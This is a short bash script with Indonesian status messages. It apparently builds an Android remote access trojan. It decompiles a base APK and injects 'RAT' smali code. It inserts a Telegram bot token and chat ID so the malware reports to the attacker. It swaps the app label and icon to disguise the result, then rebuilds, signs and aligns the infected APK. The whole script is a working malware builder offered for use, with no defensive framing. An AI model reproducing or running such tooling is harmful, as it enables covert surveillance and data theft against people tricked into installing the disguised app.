#!/bin/bash

# Usage: ./builder.sh TOKEN CHAT_ID LABEL ICON_PATH

TOKEN=$1
CHATID=$2
LABEL=$3
ICON=$4

echo "[*] Mendekompilasi APK dasar..."
apktool d base_app.apk -o temp_app

echo "[*] Menyisipkan kode smali RAT..."
mkdir -p temp_app/smali/com/rat/
cp -r smali_injection/* temp_app/smali/com/rat/

echo "[*] Mengisi token dan chat id..."
sed -i "s/TOKEN_TELEGRAM/${TOKEN}/g" temp_app/smali/com/rat/TelegramSender.smali
sed -i "s/CHAT_ID_TELEGRAM/${CHATID}/g" temp_app/smali/com/rat/TelegramSender.smali

echo "[*] Mengganti label aplikasi..."
sed -i "s/app_name\".*\"/app_name\" \"${LABEL}\"/" temp_app/res/values/strings.xml

echo "[*] Mengganti icon..."
cp "$ICON" temp_app/res/drawable/icon.png

echo "[*] Rebuild APK..."
apktool b temp_app -o output/rat_unsigned.apk

echo "[*] Signing APK..."
keytool -genkey -v -keystore debug.keystore -alias androiddebugkey -keyalg RSA -keysize 2048 -validity 10000 -storepass android -keypass android -dname "CN=Android Debug,O=Android,C=US"
jarsigner -verbose -keystore debug.keystore -storepass android output/rat_unsigned.apk androiddebugkey

echo "[*] Align APK..."
zipalign -v 4 output/rat_unsigned.apk output/rat_final.apk

echo "[✓] APK RAT selesai: output/rat_final.apk"